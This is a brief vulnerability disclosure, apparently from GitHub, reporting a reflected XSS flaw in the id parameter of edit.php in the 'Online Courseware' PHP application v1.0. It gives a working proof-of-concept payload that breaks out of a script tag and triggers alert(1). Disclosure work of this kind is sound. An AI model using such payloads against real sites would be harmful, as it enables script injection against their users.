#### BUG_AUTHOR:LIU WEIYU
## Online Courseware – reflected XSS on (edit.php?id=XX) 
### Vendor Homepage:
https://www.sourcecodester.com/php/4818/online-courseware-using-phpmysql.html 
### Version:V1.0
### Tested on: PHP, Apache, MySQL
### Affected Page:
edit.php?id=XX 

On this page,id parameter is vulnerable to reflected XSS Attack 
### Proof of vulnerability:
#### Visit this page：
http://localhost/onlinecourseware/pcci/admin/edit.php?id=1
### Payload：
“></script><script>alert(1)</script>
### Trigger popup：
<img width="416" alt="image" src="https://github.com/thisissuperann/Vul/assets/148440408/daf3a6c2-5400-4bf8-b64e-84f7f0606ef0">
